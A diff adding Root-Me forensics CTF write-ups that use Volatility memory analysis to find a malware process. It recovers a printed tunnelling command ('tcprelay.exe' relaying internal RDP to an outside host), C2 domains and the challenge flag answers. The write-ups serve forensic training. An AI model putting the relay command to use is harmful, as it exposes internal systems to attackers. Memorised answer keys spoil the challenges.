@@ -10,9 +10,9 @@ Train digital investigation skills by analyzing memory dumps, log files, network
 4. [Find the cat](#find-the-cat)
 5. [Ugly Duckling](#ugly-duckling)
 6. [Active Directory - GPO](#active-directory-gpo)
-7. [Command & Control - level 3](#command-and-control-level-3)
+7. [Command & Control - level 3](#command-and-control-level-3) 🗸
 8. [DNS exfiltration](#dns-exfiltration)
-9. [Command & Control - level 4](#command-and-control-level-4)
+9. [Command & Control - level 4](#command-and-control-level-4) 🗸
 10. [Job interview](#job-interview)
 11. [Homemade keylogger](#homemade-keylogger)
 12. [macOS - Keychain](#macos-keychain)
@@ -23,7 +23,7 @@ Train digital investigation skills by analyzing memory dumps, log files, network
 17. [Multi-devices](#multi-devices)
 18. [Root My Droid](#root-my-droid)
 19. [Rootkit - Cold case](#rootkit-cold-case)
-20. [Command & Control - level 6](#command-and-control-level-6)
+20. [Command & Control - level 6](#command-and-control-level-6) 🗸
 21. [Find me](#find-me)
 22. [Second job interview](#second-job-interview)
 23. [Find me again](#find-me-again)
@@ -412,6 +412,544 @@ $ hashcat -m 1000 -a 0 -w 3 hashes.txt rockyou.txt -o cracked.txt
 
 ~~~
 passw0rd
+~~~
+
+</details>
+
+---
+
+### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+
+## Command and Control level 3
+
+- Author: Thanat0s
+- Date: 16 February 2013
+- Points: 30
+- Level: 3
+
+### Statement
+
+Berthier, the antivirus software didn’t find anything. It’s up to you now. Try to find the malware in the memory dump. The validation flag is the md5 checksum of the full path of the executable.
+
+The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de
+
+### Resources
+
+1. [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)
+2. [Volatility Cheatsheet v2.4](https://repository.root-me.org/Forensic/EN%20-%20Volatility%20cheatsheet%20v2.4.pdf).
+
+### Link
+
+1. [ch3.php](http://challenge01.root-me.org/forensic/ch3/ch3.php).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+Visiting the challenge site, the challenge file [ch2.tbz2](http://challenge01.root-me.org/forensic/ch2/ch2.tbz2) can be found.  This can be downloaded, decompiled and reviewed:
+
+~~~shell
+$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
+--2022-01-29 14:02:21--  http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
+Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
+Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 185769248 (177M) [application/octet-stream]
+Saving to: ‘ch2.tbz2’
+
+ch2.tbz2                                                    100%[=========================================================================================================================================>] 177.16M  13.7MB/s    in 18s     
+
+2022-01-29 14:02:39 (9.73 MB/s) - ‘ch2.tbz2’ saved [185769248/185769248]
+$ bzip2 -d ch2.tbz2 
+$ file 
+ch2.tar              ch5.php              .engauge.log         .~lock.Durham.docx#  
+$ tar -xvf ch2.tar 
+ch2.dmp
+$ file ch2.dmp 
+ch2.dmp: data
+~~~
+
+The memory dump can be investigated:
+
+~~~shell
+$ volatility imageinfo -f ch2.dmp
+Volatility Foundation Volatility Framework 2.6.1
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
+                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
+                     AS Layer2 : FileAddressSpace (/home/derek/Downloads/ch2.dmp)
+                      PAE type : PAE
+                           DTB : 0x185000L
+                          KDBG : 0x82929be8L
+          Number of Processors : 1
+     Image Type (Service Pack) : 0
+                KPCR for CPU 0 : 0x8292ac00L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image date and time : 2013-01-12 16:59:18 UTC+0000
+     Image local date and time : 2013-01-12 17:59:18 +0100
+
+~~~
+
+This provides the profile and shows the memory dump is from a Windows machine.  The process tree can be dumped:
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 pstree
+Volatility Foundation Volatility Framework 2.6.1
+Name                                                  Pid   PPid   Thds   Hnds Time
+-------------------------------------------------- ------ ------ ------ ------ ----
+ 0x892ac2b8:wininit.exe                               456    396      3     77 2013-01-12 16:38:14 UTC+0000
+. 0x896294c0:services.exe                             560    456      6    205 2013-01-12 16:38:16 UTC+0000
+.. 0x89805420:svchost.exe                             832    560     19    435 2013-01-12 16:38:23 UTC+0000
+... 0x87c90d40:audiodg.exe                           1720    832      5    117 2013-01-12 16:58:11 UTC+0000
+.. 0x89852918:svchost.exe                             904    560     17    409 2013-01-12 16:38:24 UTC+0000
+... 0x87ad44d0:dwm.exe                               2496    904      5     77 2013-01-12 16:40:25 UTC+0000
+.. 0x898b2790:svchost.exe                            1172    560     15    475 2013-01-12 16:38:27 UTC+0000
+.. 0x89f3d2c0:svchost.exe                            3352    560      9    141 2013-01-12 16:40:58 UTC+0000
+.. 0x898fbb18:SearchIndexer.                         2900    560     13    636 2013-01-12 16:40:38 UTC+0000
+.. 0x8986b030:svchost.exe                             928    560     26    869 2013-01-12 16:38:24 UTC+0000
+.. 0x8a1d84e0:vmtoolsd.exe                           1968    560      6    220 2013-01-12 16:39:14 UTC+0000
+.. 0x8962f030:svchost.exe                             692    560     10    353 2013-01-12 16:38:21 UTC+0000
+.. 0x898911a8:svchost.exe                            1084    560     10    257 2013-01-12 16:38:26 UTC+0000
+.. 0x898a7868:AvastSvc.exe                           1220    560     66   1180 2013-01-12 16:38:28 UTC+0000
+.. 0x89f1d3e8:svchost.exe                            3624    560     14    348 2013-01-12 16:41:22 UTC+0000
+.. 0x9542a030:TPAutoConnSvc.                         1612    560      9    135 2013-01-12 16:39:23 UTC+0000
+... 0x87ae2880:TPAutoConnect.                        2568   1612      5    146 2013-01-12 16:40:28 UTC+0000
+.. 0x88cded40:sppsvc.exe                             1872    560      4    143 2013-01-12 16:39:02 UTC+0000
+.. 0x8a102748:svchost.exe                            1748    560     18    310 2013-01-12 16:38:58 UTC+0000
+.. 0x8a0f9c40:spoolsv.exe                            1712    560     14    338 2013-01-12 16:38:58 UTC+0000
+.. 0x9541c7e0:wlms.exe                                336    560      4     45 2013-01-12 16:39:21 UTC+0000
+.. 0x8a1f5030:VMUpgradeHelpe                          448    560      4     89 2013-01-12 16:39:21 UTC+0000
+... 0x892ced40:winlogon.exe                           500    448      3    111 2013-01-12 16:38:14 UTC+0000
+... 0x88d03a00:csrss.exe                              468    448     10    471 2013-01-12 16:38:14 UTC+0000
+.... 0x87c595b0:conhost.exe                          3228    468      2     54 2013-01-12 16:44:50 UTC+0000
+.... 0x87a9c288:conhost.exe                          2600    468      1     35 2013-01-12 16:40:28 UTC+0000
+.... 0x954826b0:conhost.exe                          2168    468      2     49 2013-01-12 16:55:50 UTC+0000
+.. 0x87bd35b8:wmpnetwk.exe                           3176    560      9    240 2013-01-12 16:40:48 UTC+0000
+.. 0x87ac0620:taskhost.exe                           2352    560      8    149 2013-01-12 16:40:24 UTC+0000
+.. 0x897b5c20:svchost.exe                             764    560      7    263 2013-01-12 16:38:23 UTC+0000
+. 0x8962f7e8:lsm.exe                                  584    456     10    142 2013-01-12 16:38:16 UTC+0000
+. 0x896427b8:lsass.exe                                576    456      6    566 2013-01-12 16:38:16 UTC+0000
+ 0x8929fd40:csrss.exe                                 404    396      9    469 2013-01-12 16:38:14 UTC+0000
+ 0x87978b78:System                                      4      0    103   3257 2013-01-12 16:38:09 UTC+0000
+. 0x88c3ed40:smss.exe                                 308      4      2     29 2013-01-12 16:38:09 UTC+0000
+ 0x87ac6030:explorer.exe                             2548   2484     24    766 2013-01-12 16:40:27 UTC+0000
+. 0x87b6b030:iexplore.exe                            2772   2548      2     74 2013-01-12 16:40:34 UTC+0000
+.. 0x89898030:cmd.exe                                1616   2772      2    101 2013-01-12 16:55:49 UTC+0000
+. 0x95495c18:taskmgr.exe                             1232   2548      6    116 2013-01-12 16:42:29 UTC+0000
+. 0x87bf7030:cmd.exe                                 3152   2548      1     23 2013-01-12 16:44:50 UTC+0000
+.. 0x87cbfd40:winpmem-1.3.1.                         3144   3152      1     23 2013-01-12 16:59:17 UTC+0000
+. 0x898fe8c0:StikyNot.exe                            2744   2548      8    135 2013-01-12 16:40:32 UTC+0000
+. 0x87b784b0:AvastUI.exe                             2720   2548     14    220 2013-01-12 16:40:31 UTC+0000
+. 0x87b82438:VMwareTray.exe                          2660   2548      5     80 2013-01-12 16:40:29 UTC+0000
+. 0x87c6a2a0:swriter.exe                             3452   2548      1     19 2013-01-12 16:41:01 UTC+0000
+.. 0x87ba4030:soffice.exe                            3512   3452      1     28 2013-01-12 16:41:03 UTC+0000
+... 0x87b8ca58:soffice.bin                           3564   3512     12    400 2013-01-12 16:41:05 UTC+0000
+. 0x9549f678:iexplore.exe                            1136   2548     18    454 2013-01-12 16:57:44 UTC+0000
+.. 0x87d4d338:iexplore.exe                           3044   1136     37    937 2013-01-12 16:57:46 UTC+0000
+. 0x87aa9220:VMwareUser.exe                          2676   2548      8    190 2013-01-12 16:40:30 UTC+0000
+ 0x95483d18:soffice.bin                              3556   3544      0 ------ 2013-01-12 16:41:05 UTC+0000
+~~~
+
+The cmd.exe is shown as a child process of internet explorer (pids 1616 and 2772)?  There is something suspicious here. The handles can be found.  Staring with Mutants:
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 handles -p 1616 -t Mutant
+Volatility Foundation Volatility Framework 2.6.1
+Offset(V)     Pid     Handle     Access Type             Details
+---------- ------ ---------- ---------- ---------------- -------
+0x89f52748   1616       0xe0   0x1f0001 Mutant           
+0x89f3d0a8   1616      0x218   0x1f0001 Mutant           
+0x88baedf0   1616      0x220   0x1f0001 Mutant 
+~~~
+
+The file handles can also be retrieved:
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 handles -p 1616 -t File
+Volatility Foundation Volatility Framework 2.6.1
+Offset(V)     Pid     Handle     Access Type             Details
+---------- ------ ---------- ---------- ---------------- -------
+0x87d1e8f0   1616       0x20   0x12019f File             \Device\aswSP_Open
+0x87b47e10   1616       0x24   0x120089 File             \Device\aswSnx
+0x892f9a30   1616       0x30   0x16019f File             \Device\Afd\Endpoint
+0x87b9ab28   1616       0x40   0x120089 File             \Device\HarddiskVolume1\Windows\System32\en-US\cmd.exe.mui
+0x892f9a30   1616       0x5c   0x16019f File             \Device\Afd\Endpoint
+0x87ba46d8   1616       0x88   0x100020 File             \Device\HarddiskVolume1\Windows\winsxs\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7600.16385_none_421189da2b7fabfc
+0x87bac1f0   1616       0xc8   0x100001 File             \Device\KsecDD
+0x87c4a038   1616      0x1fc   0x100020 File             \Device\HarddiskVolume1\Users\JOHNDO~1\AppData\Local\Temp
+~~~
+
+Reviewing the iexplorer.exe:
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 dlllist -p 2772
+Volatility Foundation Volatility Framework 2.6.1
+************************************************************************
+iexplore.exe pid:   2772
+Command line : "C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe" 
+
+
+Base             Size  LoadCount LoadTime                       Path
+---------- ---------- ---------- ------------------------------ ----
+0x00400000     0x6000     0xffff 1970-01-01 00:00:00 UTC+0000   C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe
+0x77660000   0x13c000     0xffff 1970-01-01 00:00:00 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll
+0x70e70000    0x3c000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Program Files\AVAST Software\Avast\snxhk.dll
+0x77480000    0xd4000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\KERNEL32.dll
+0x75920000    0x4a000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\KERNELBASE.dll
+0x76a60000    0xac000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\msvcrt.dll
+0x777a0000    0x35000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\WS2_32.DLL
+0x76c10000    0xa1000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\RPCRT4.dll
+0x77880000     0x6000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\NSI.dll
+0x751f0000    0x3c000        0x4 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\mswsock.dll
+0x76990000    0xc9000       0x18 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\user32.dll
+0x75ab0000    0x4e000       0x15 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\GDI32.dll
+0x76980000     0xa000        0x6 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\LPK.dll
+0x777e0000    0x9d000        0x6 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\USP10.dll
+0x75b00000    0x1f000        0x2 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\IMM32.DLL
+0x77210000    0xcc000        0x1 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\MSCTF.dll
+0x750b0000    0x44000        0x2 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\DNSAPI.dll
+0x76ec0000    0x19000        0x2 2013-01-12 16:55:34 UTC+0000   C:\Windows\SYSTEM32\sechost.dll
+0x73fa0000    0x1c000        0x1 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\IPHLPAPI.DLL
+0x73f80000     0x7000        0x1 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\WINNSI.DLL
+0x727d0000     0x6000        0x1 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\rasadhlp.dll
+0x74d40000     0x5000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\System32\wshtcpip.dll
+0x747b0000    0x10000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\system32\NLAapi.dll
+0x72810000     0x8000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\System32\winrnr.dll
+0x72800000    0x10000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\system32\napinsp.dll
+0x727e0000    0x12000        0x2 2013-01-12 16:55:49 UTC+0000   C:\Windows\system32\pnrpnsp.dll
+0x73d80000    0x38000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\System32\fwpuclnt.dll
+0x756b0000    0x4b000     0xffff 2013-01-12 16:55:49 UTC+0000   C:\Windows\system32\apphelp.dll
+~~~
+
+The directory C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe can be hashed to generate the answer
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+49979149632639432397b3a1df8cb43d
+~~~
+
+</details>
+
+---
+
+### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+
+## Command and Control level 4
+
+- Author: Thanat0s
+- Date: 16 February 2013
+- Points: 35
+- Level: 3
+
+### Statement
+
+Berthier, thanks to this new information about the processes running on the workstation, it’s clear that this malware is used to exfiltrate data. Find out the ip of the internal server targeted by the hackers!
+
+The validation flag should have this format : IP:PORT
+
+The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de
+
+### Resources
+
+1. [Volatility Cheatsheet v2.4](https://repository.root-me.org/Forensic/EN%20-%20Volatility%20cheatsheet%20v2.4.pdf).
+
+### Link
+
+1. [ch4.php](http://challenge01.root-me.org/forensic/ch4/ch4.php).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+Visiting the challenge site, the challenge file [ch2.tbz2](http://challenge01.root-me.org/forensic/ch2/ch2.tbz2) can be found.  This can be downloaded, decompiled and reviewed:
+
+~~~shell
+$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
+--2022-01-29 14:02:21--  http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
+Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
+Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 185769248 (177M) [application/octet-stream]
+Saving to: ‘ch2.tbz2’
+
+ch2.tbz2                                                    100%[=========================================================================================================================================>] 177.16M  13.7MB/s    in 18s     
+
+2022-01-29 14:02:39 (9.73 MB/s) - ‘ch2.tbz2’ saved [185769248/185769248]
+$ bzip2 -d ch2.tbz2 
+$ file 
+ch2.tar              ch5.php              .engauge.log         .~lock.Durham.docx#  
+$ tar -xvf ch2.tar 
+ch2.dmp
+$ file ch2.dmp 
+ch2.dmp: data
+~~~
+
+The memory dump can be investigated:
+
+~~~shell
+$ volatility imageinfo -f ch2.dmp
+Volatility Foundation Volatility Framework 2.6.1
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
+                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
+                     AS Layer2 : FileAddressSpace (/home/derek/Downloads/ch2.dmp)
+                      PAE type : PAE
+                           DTB : 0x185000L
+                          KDBG : 0x82929be8L
+          Number of Processors : 1
+     Image Type (Service Pack) : 0
+                KPCR for CPU 0 : 0x8292ac00L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image date and time : 2013-01-12 16:59:18 UTC+0000
+     Image local date and time : 2013-01-12 17:59:18 +0100
+
+~~~
+
+Using the solution to the previous challenge, the pid2772 connections can be found using netscan:
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 netscan | grep 2772
+Volatility Foundation Volatility Framework 2.6.1
+0x1dedb4f8         TCPv4    127.0.0.1:49178                127.0.0.1:12080      ESTABLISHED      2772     iexplore.exe 
+~~~
+
+The console command history (cmd.exe) can be found:
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 consoles
+Volatility Foundation Volatility Framework 2.6.1
+**************************************************
+ConsoleProcess: conhost.exe Pid: 3228
+Console: 0x1081c0 CommandHistorySize: 50
+HistoryBufferCount: 2 HistoryBufferMax: 4
+OriginalTitle: Command Prompt
+Title: Administrator: Command Prompt - winpmem-1.3.1.exe  ram.dmp
+AttachedProcess: winpmem-1.3.1. Pid: 3144 Handle: 0x90
+AttachedProcess: cmd.exe Pid: 3152 Handle: 0x64
+----
+CommandHistory: 0x3007a8 Application: winpmem-1.3.1.exe Flags: Allocated
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x90
+----
+CommandHistory: 0x2ff638 Application: cmd.exe Flags: Allocated, Reset
+CommandCount: 5 LastAdded: 4 LastDisplayed: 4
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x64
+Cmd #0 at 0x2fcd58: cd %temp%
+Cmd #1 at 0x2fd348: dir
+Cmd #2 at 0x2e1038: cd imagedump
+Cmd #3 at 0x2fd378: dir
+Cmd #4 at 0x304870: winpmem-1.3.1.exe ram.dmp
+----
+Screen 0x2e64b8 X:80 Y:300
+Dump:
+
+**************************************************
+ConsoleProcess: conhost.exe Pid: 2168
+Console: 0x1081c0 CommandHistorySize: 50
+HistoryBufferCount: 3 HistoryBufferMax: 4
+OriginalTitle: %SystemRoot%\system32\cmd.exe
+Title: C:\Windows\system32\cmd.exe
+AttachedProcess: cmd.exe Pid: 1616 Handle: 0x64
+----
+CommandHistory: 0x427a60 Application: tcprelay.exe Flags: 
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x0
+----
+CommandHistory: 0x427890 Application: whoami.exe Flags: 
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x0
+----
+CommandHistory: 0x427700 Application: cmd.exe Flags: Allocated
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x64
+----
+Screen 0x416348 X:80 Y:300
+Dump:
+~~~
+
+Process conhost.exe Pid: 2168 has PID 1616 as an attached process.  A memorydump can be generated for this process:
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 memdump -p 2168 -D ./
+Volatility Foundation Volatility Framework 2.6.1
+************************************************************************
+Writing conhost.exe [  2168] to 2168.dmp
+~~~
+
+The tcpreplay executable is associated with this process, we can search the memory dump for this string:
+
+~~~shell
+$ strings 2168.dmp | grep tcprelay
+tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
+tcprelay.c
+C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
+C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
+C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
+C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
+C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
+5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
+~~~
+
+The private IP address and port can be used to validate the challenge
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+192.168.0.22:3389
+~~~
+
+</details>
+
+---
+
+### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+
+## Command and Control level 6
+
+- Author: Thanat0s
+- Date: 16 February 2013
+- Points: 50
+- Level: 3
+
+### Statement
+
+Berthier, before blocking any of the malware’s traffic on our firewalls, we need to make sure we found all its C&C. This will let us know if there are other infected hosts on our network and be certain we’ve locked the attackers out. That’s it Berthier, we’re almost there, reverse this malware!
+
+The validation password is a fully qualified domain name : hote.domaine.tld
+
+The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de
+NB : This challenge require the clearance of the level 3.
+
+### Resources
+
+1. [Volatility Cheatsheet v2.4](https://repository.root-me.org/Forensic/EN%20-%20Volatility%20cheatsheet%20v2.4.pdf).
+
+### Link
+
+1. [ch6.php](http://challenge01.root-me.org/forensic/ch6/ch6.php).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+Visiting the challenge site, the challenge file [ch2.tbz2](http://challenge01.root-me.org/forensic/ch2/ch2.tbz2) can be found.  This can be downloaded, decompiled and reviewed:
+
+~~~shell
+$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
+--2022-01-29 14:02:21--  http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
+Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
+Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 185769248 (177M) [application/octet-stream]
+Saving to: ‘ch2.tbz2’
+
+ch2.tbz2                                                    100%[=========================================================================================================================================>] 177.16M  13.7MB/s    in 18s     
+
+2022-01-29 14:02:39 (9.73 MB/s) - ‘ch2.tbz2’ saved [185769248/185769248]
+$ bzip2 -d ch2.tbz2 
+$ file 
+ch2.tar              ch5.php              .engauge.log         .~lock.Durham.docx#  
+$ tar -xvf ch2.tar 
+ch2.dmp
+$ file ch2.dmp 
+ch2.dmp: data
+~~~
+
+The memory dump can be investigated:
+
+~~~shell
+$ volatility imageinfo -f ch2.dmp
+Volatility Foundation Volatility Framework 2.6.1
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
+                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
+                     AS Layer2 : FileAddressSpace (/home/derek/Downloads/ch2.dmp)
+                      PAE type : PAE
+                           DTB : 0x185000L
+                          KDBG : 0x82929be8L
+          Number of Processors : 1
+     Image Type (Service Pack) : 0
+                KPCR for CPU 0 : 0x8292ac00L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image date and time : 2013-01-12 16:59:18 UTC+0000
+     Image local date and time : 2013-01-12 17:59:18 +0100
+
+~~~
+
+Using the solution to the previous challenge, the pid2772 connections can be found using netscan:
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 netscan | grep 2772
+Volatility Foundation Volatility Framework 2.6.1
+0x1dedb4f8         TCPv4    127.0.0.1:49178                127.0.0.1:12080      ESTABLISHED      2772     iexplore.exe 
+~~~
+
+The malware executable can be exported using procdump
+
+~~~shell
+$ volatility -f ch2.dmp --profile=Win7SP0x86 procdump -p 2772 --dump-dir ./
+Volatility Foundation Volatility Framework 2.6.1
+Process(V) ImageBase  Name                 Result
+---------- ---------- -------------------- ------
+0x87b6b030 0x00400000 iexplore.exe         OK: executable.2772.exe
+~~~
+
+This executable.2772.exe binary can be exported to an [online Malware analysis site](https://www.hybrid-analysis.com).  This aligns to existing reports for executable.2772.exe which shows the DNS queries:
+
+~~~
+Domain 	Address 	Registrar 	Country
+ns2.wrauzfevvo.com 	- 	- 	-
+whereare.sexy-serbian 	- 	- 	-
+y0ug.itisjustluck.com 	- 	- 	-
+th1sis.l1k3aK3y.org 	- 	- 	-
+furious.devilslife.com 	106.187.41.154 	- 	Flag of Japan Japan
+~~~
+
+The answer is the like a key.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+th1sis.l1k3aK3y.org
 ~~~
 
 </details>
